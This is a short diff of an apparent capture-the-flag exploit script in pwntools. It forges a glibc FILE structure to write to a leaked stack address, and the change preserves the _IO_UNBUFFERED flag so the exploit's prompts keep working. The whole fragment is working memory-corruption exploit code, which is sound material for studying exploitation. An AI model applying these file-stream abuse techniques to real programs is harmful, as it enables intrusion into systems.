@@ -109,7 +109,12 @@ edit(payload)
 create(8, 8, 8, 10, b"1337")
 fs = FileStructure()
 payload = bytearray(fs.write(addr=leak_stack_addr, size=0x10))
-payload[:4] = p32(0xfbad2886)
+
+# _flags from https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L66 # noqa
+# we need to preserve _IO_UNBUFFERED (0x2) such that the prompt '> ' is printed out
+# and our sendafter and sendlineafter works normally
+_IO_UNBUFFERED = 0x2
+payload[:4] = p32(u32(payload[:4]) | _IO_UNBUFFERED)
 create(9, 9, 8, 10, payload[:80], force=True)
 
 stack_leak = u64(io.recv(8))
